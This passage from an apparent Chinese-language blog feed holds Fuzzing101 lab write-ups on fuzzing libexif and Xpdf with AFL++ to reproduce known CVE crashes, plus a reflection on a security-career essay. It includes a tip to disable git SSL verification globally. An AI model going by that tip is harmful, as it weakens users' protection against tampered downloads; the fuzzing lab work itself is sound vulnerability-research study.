    <content type="html"><![CDATA[<h2 id="Exercise2-libexif"><a href="#Exercise2-libexif" class="headerlink" title="Exercise2 libexif"></a>Exercise2 libexif</h2><h3 id="任务目标："><a href="#任务目标：" class="headerlink" title="任务目标："></a>任务目标：</h3><p>对libexif EXIF解析库进行模糊测试，目标是在 libexif 0.6.14 中找到 <a href="https://nvd.nist.gov/vuln/detail/CVE-2009-3895">CVE-2009-3895</a> （一种基于堆的缓冲区溢出）的崩溃&#x2F;PoC 和 <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2836">CVE-2012-2836</a> （越界读取漏洞）的另一个崩溃。</p><h3 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h3><p><strong>下载并解压libexif</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/libexif/</span>libexif<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/tags/</span>libexif-<span class="hljs-number">0</span>_6_14-release.tar.gz<br>tar -xzvf libexif-<span class="hljs-number">0</span>_6_14-release.tar.gz<br></code></pre></td></tr></table></figure><p>libexif是一个开源的用于处理Exchangeable Image File Format (EXIF) 数据的C语言库，提供了一组功能强大的API，用于读取、写入和操作EXIF数据。</p><p><strong>安装libexif</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd libexif-libexif-0_6_14-release/<br>sudo apt-<span class="hljs-built_in">get</span> install autopoint libtool gettext libpopt-dev<br>autoreconf -fvi<br>./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p><code>autoreconf</code> 是一个用于自动重建 Autotools 构建系统的工具，该命令通常用于在源代码目录中运行 Autotools 工具链，以重新生成配置脚本 <code>configure</code>、构建规则 <code>Makefile.in</code> 和其他相关文件。这样可以确保配置和构建系统与当前环境和依赖项保持同步。</p><p><strong>安装EXIF</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_libexif<br>wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz<br>tar -xzvf exif-0_6_15-release.tar.gz<br><br><span class="hljs-built_in">cd</span> exif-exif-0_6_15-release/<br>autoreconf -fvi<br>./configure --enable-shared=no --prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span> PKG_CONFIG_PATH=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig<br>make<br>make install<br></code></pre></td></tr></table></figure><p>由于libexif是一个库，是一组功能的集合而本身不是一个独立的执行文件，因此需要安装使用这个库的一个应用程序来进行模糊测试。使用库的程序通常会验证输入数据的有效性和合法性。模糊测试工具可能生成具有不同格式的输入，包括不合法的输入。使用该库的程序可以验证并解析这些输入。</p><p><strong>验证安装</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/i</span>nstall<span class="hljs-regexp">/bin/</span>exif<br></code></pre></td></tr></table></figure><p><strong>获取样本</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ianare/</span>exif-samples<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/heads/m</span>aster.zip<br>unzip master.zip<br></code></pre></td></tr></table></figure><p><strong>使用alf-clang-lto编译libexif和exif</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rm -r <span class="hljs-variable">$HOME</span>/fuzzing_libexif/install<br>cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif/libexif-libexif-0_6_14-release/<br>make clean<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=afl-clang-lto ./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif/exif-exif-0_6_15-release<br>make clean<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=afl-clang-lto ./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span> <span class="hljs-attribute">PKG_CONFIG_PATH</span>=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig<br>make<br>make install<br></code></pre></td></tr></table></figure><p>afl-clang-lto 是 AFL的一个定制版本，它使用了 Link Time Optimization（LTO）技术。LTO 可以在链接时优化代码，包括在不同编译单元之间进行全局的代码优化。通过使用 afl-clang-lto 编译，可以提高模糊测试的代码覆盖率，因为优化的代码更有可能探索到更多路径和分支。同时相比于afl-clang，afl-clang-lto具有更好的性能。</p><p><strong>进行模糊测试</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/</span>exif-samples-master<span class="hljs-regexp">/jpg/</span> -o <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/</span>out<span class="hljs-regexp">/ -s 123 -- $HOME/</span>fuzzing_libexif<span class="hljs-regexp">/install/</span>bin/exif @@<br></code></pre></td></tr></table></figure><p>得到如下输出</p><p><img src="/2023/07/19/Exercise2/image-20230721171848925.png" alt="image-20230721171848925"></p><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>编译出带调试信息的可执行文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd libexif-libexif-0_6_14-release<br>make clean<br><span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">CXXFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br> <br>cd exif-exif-0_6_15-release<br>make clean<br><span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">CXXFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">PKG_CONFIG_PATH</span>=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>通过GDB跑出crash</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args .<span class="hljs-regexp">/install/</span>bin<span class="hljs-regexp">/exif ./</span>out<span class="hljs-regexp">/default/</span>crashes/&lt;your filename&gt;<br></code></pre></td></tr></table></figure><p><strong>crash1</strong></p><p><img src="/2023/07/19/Exercise2/image-20230722111050543.png" alt="image-20230722111050543"></p><p>与Exercise1一样，报错为SIGSEGV，Segmentation fault，存在内存泄漏，根据报错信息可以看出为地址无法访问</p><p><strong>crash2</strong></p><p><img src="/2023/07/19/Exercise2/image-20230722111516258.png" alt="image-20230722111516258"></p><p>错误信息：存在内存泄漏</p><p>错误位置：..&#x2F;sysdeps&#x2F;x86_64&#x2F;multiarch&#x2F;memmove-vec-unaligned-erms.S</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>官方修复方案：</p><ul><li><a href="https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361">https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361</a></li><li><a href="https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06">https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing101-Exercise1</title>
    <link href="/2023/07/09/Exercise1/"/>
    <url>/2023/07/09/Exercise1/</url>
    
    <content type="html"><![CDATA[<h2 id="Fuzzing-101"><a href="#Fuzzing-101" class="headerlink" title="Fuzzing 101"></a>Fuzzing 101</h2><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><p>实验目的：安装Xpdf，安装AFL工具并了解如何使用</p><p>创建目录并安装基本工具包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> fuzzing_xpdf &amp;&amp; <span class="hljs-built_in">cd</span> fuzzing_xpdf/<br>sudo apt install build-essential<br></code></pre></td></tr></table></figure><p>下载，解压Xpdf，并完成安装</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">wget https://<span class="hljs-keyword">dl</span>.xpdfreader.<span class="hljs-keyword">com</span>/old/xpdf-<span class="hljs-number">3.02</span>.tar.gz<br>tar -xvzf xpdf-<span class="hljs-number">3.02</span>.tar.gz<br><span class="hljs-keyword">cd</span> xpdf-<span class="hljs-number">3.02</span><br>sudo apt <span class="hljs-keyword">update</span> &amp;&amp; sudo apt install -<span class="hljs-keyword">y</span> build-essential gcc<br>./configure --prefix=<span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>测试Xpdf，可以下载测试样例或者自己造一个pdf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_xpdf<br><span class="hljs-built_in">mkdir</span> pdf_examples &amp;&amp; <span class="hljs-built_in">cd</span> pdf_examples<br>wget http://www.africau.edu/images/default/sample.pdf<br></code></pre></td></tr></table></figure><p>通过命令 <code>$HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/sample.pdf</code>  可以得到如下输出</p><p><img src="/2023/07/09/Exercise1/image-20230708231306619.png" alt="image-20230708231306619"></p><p><code>$HOME/fuzzing_xpdf/install/bin/pdfinfo</code> 指定的要执行的程序路径，<code>-box -meta</code> 是向pdfinfo程序传递的选项和参数，-box 表示显示文档的页面框线，-meta显示文档的元数据信息</p><p><code>$HOME/fuzzing_xpdf/pdf_examples/sample.pdf</code> 指定的是要操作的pdf文件</p><p><img src="/2023/07/09/Exercise1/image-20230708231459280.png" alt="image-20230708231459280"></p><p>在pdfinfo的目录下还有如下程序：</p><ul><li>pdffonts：用于显示 PDF 文件中使用的字体信息，包括字体名称、类型、嵌入状态等</li><li>pdfimages：用于从 PDF 文件中提取图像。它可以将 PDF 文件中的图像提取为独立的图像文件</li><li>pdftops：用于将 PDF 文件转换为 PostScript 格式。PostScript 是一种页面描述语言，可以在打印机或其他设备上进行渲染和打印</li><li>pdftotext：用于将 PDF 文件中的文本提取为纯文本格式</li></ul><p>接下来安装AFL++</p><p>第一条安装命令用于安装构建软件包（<code>build-essential</code>）、Python 3 开发库（<code>python3-dev</code>）、自动构建工具（<code>automake</code>）、版本控制工具 Git（<code>git</code>）、词法分析器生成器 Flex（<code>flex</code>）、语法分析器生成器 Bison（<code>bison</code>）、GLib 开发库（<code>libglib2.0-dev</code>）、像素管理库 Pixman 开发库（<code>libpixman-1-dev</code>）以及 Python 3 的 setuptools。</p><p>第二条安装命令用于安装 LLVM 和 Clang </p><p>第三条安装命令根据系统上已安装的 GCC 版本，安装相应的插件开发包和 libstdc++ 开发库</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.<span class="hljs-number">0</span>-dev libpixman-<span class="hljs-number">1</span>-dev python3-setuptools<br>sudo apt-get install -y lld-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span>-dev clang-<span class="hljs-number">11</span><span class="hljs-operator"> || </span>sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-plugin-dev libstdc++-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-dev<br></code></pre></td></tr></table></figure><p>接着安装AFL++工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span><br>git <span class="hljs-built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-built_in">cd</span> AFLplusplus<br><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br>make distrib<br>sudo make install<br></code></pre></td></tr></table></figure><p>此处遇到一个报错：</p><p><img src="/2023/07/09/Exercise1/image-20230709105123404.png" alt="image-20230709105123404"></p><p>可以通过禁用SSL证书解决，但会降低安全性，需要在可靠的网络环境中操作</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install gnutls-bin<br>git<span class="hljs-built_in"> config </span>--global http.sslVerify <span class="hljs-literal">false</span><br>git<span class="hljs-built_in"> config </span>--global http.postBuffer 1048576000<br></code></pre></td></tr></table></figure><p>至此AFL安装完成，可以输入 <code>afl-fuzz</code>得到如下输出</p><p><img src="/2023/07/09/Exercise1/image-20230709151638679.png" alt="image-20230709151638679"></p><p>通过命令，可以对pdftotext进行测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples<span class="hljs-regexp">/ -o $HOME/</span>fuzzing_xpdf<span class="hljs-regexp">/out/</span> -s <span class="hljs-number">123</span> -- <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext @@ <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></td></tr></table></figure><p>该命令使用 AFL 工具对 pdftotext 程序进行模糊测试。它从指定的输入文件夹中获取测试样本，将 AFL 输出结果保存到out中。使用随机数种子 123，测试 pdftotext 程序，并将程序的输出结果保存到output中</p><p>等待程序运行可以得到如下结果，红色的为发现的崩溃</p><p><img src="/2023/07/09/Exercise1/image-20230709215359532.png" alt="image-20230709215359532"></p><p>运行命令，<code>-g</code> 选项用于在编译过程中生成调试符号信息，而 <code>-O0</code> 选项则指示编译器禁用优化。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">make clean<br><span class="hljs-attribute">CFLAGS</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> CXXFLAGS<span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> ./configure --prefix<span class="hljs-operator">=</span><span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>运行gdb，此处的your filename应该填写crashes文件夹中的，包含报错信息的文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>out<span class="hljs-regexp">/default/</span>crashes<span class="hljs-regexp">/&lt;your filename&gt; $HOME/</span>fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><p>输入run或者r来运行，可以得到错误信息，程序收到了SIGSEGV信号，也称为分段错误（Segmentation fault）。这种错误通常是由于访问无效的内存地址导致的。</p><p><img src="/2023/07/09/Exercise1/image-20230716150720853.png" alt="image-20230716150720853"></p><p>通过bt命令进行回溯，可以看到反复进行了getobj和makestream的调用</p><p><img src="/2023/07/09/Exercise1/image-20230716153423406.png" alt="image-20230716153423406"></p><p>下载官方修复了该问题的Xpdf4.02发现，与此版本相比，添加了一个记录循环次数的变量，解决该问题</p><p>旧：</p><p><img src="/2023/07/09/Exercise1/image-20230716153759316.png" alt="image-20230716153759316"></p><p>新：</p><p><img src="/2023/07/09/Exercise1/image-20230716154017601.png" alt="image-20230716154017601"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>此次实验了解了模糊测试器功能，通过种子的变异和组合不断对pdftotext这个程序进行测试。同时也熟悉了gdb的相关操作以及提升了一定的程序流分析能力。</p>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>读后感：So you want to work in security?</title>
    <link href="/2023/07/07/ReflectionPeper/"/>
    <url>/2023/07/07/ReflectionPeper/</url>
    
    <content type="html"><![CDATA[<h2 id="读后感：So-you-want-to-work-in-security"><a href="#读后感：So-you-want-to-work-in-security" class="headerlink" title="读后感：So you want to work in security?"></a>读后感：So you want to work in security?</h2><p><a href="http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html">So you want to work in security?</a></p><h3 id="得忙起来"><a href="#得忙起来" class="headerlink" title="得忙起来"></a>得忙起来</h3><p>对于这篇博客，我更愿意将其视作一个纠正我暑期，或是说毕业之后的一个较为松懈的学习态度以及开学前以何种学习方式去补充自己的不足的一篇文章。</p><p>显然，本科毕业确实给我带来了一些可能与我并不相称的快乐，即其实我算是选择大于努力的那一部分人，在考研过程中我并未付出和其他人那般的努力，所以其实更应该看到自己与别人的差距，让我快要生锈的脑子转起来。</p><h3 id="任重道远"><a href="#任重道远" class="headerlink" title="任重道远"></a>任重道远</h3><p>安全方向所涉及的知识面的广度，在我浅薄的认知里，我认为是大于其他方向的。这一点其实早期在蓝鲸短暂学习的时候就感受过了。而其实这也是我在文中感觉被狠狠打脸的一部分。“<strong>Don’t give up when you encounter things you don’t understand</strong>”文中如是说，其实原来我很有幸的扛过了蓝鲸筛选的第一阶段，但随着难度上升，我逃避了。很戏谑的，某学长就在交流中问过：“这回学不学的下去”。我认为这一点确实也是我需要去克服的。</p><p>同时，文中写到要充分利用资源，对于这一点，我认为应该是充分的利用有效资源，或者说是如何高效的利用资源处理亟待解决的问题。其实无论从本科的学习还是说之前的毕设或者是论文分享，都可以看出，查找学习知识是一个类似于剥洋葱的过程，查找A中发现有B不懂，那么再去找B，学习B是发现其中出现的C，D不清楚，那么就应该先去把C，D看懂，再一层层往上反着推，无疑这会消耗大量时间，但总归是要比一知半解的了解A是什么会来的更有收获。</p><h3 id="保持思考"><a href="#保持思考" class="headerlink" title="保持思考"></a>保持思考</h3><p>这一点不仅是说是，如何去提出问题，也是面对一个问题时你能怎么去解决。安全方面，解决问题需要灵活性，可能本科期间，多数时间我们都在跟着课本学习所谓的标准答案，也就是文中提到的“If you prefer to follow a pre-set curriculum, you’re not going to get very far in security”跟着预定的课程走。我确实不否认我更乐意去按着安排做事儿，答案跟着标准答案走，但我觉着确实也应该做出一些突破了。</p>]]></content>
    
    
    <categories>
      
      <category>Something interesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>read</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
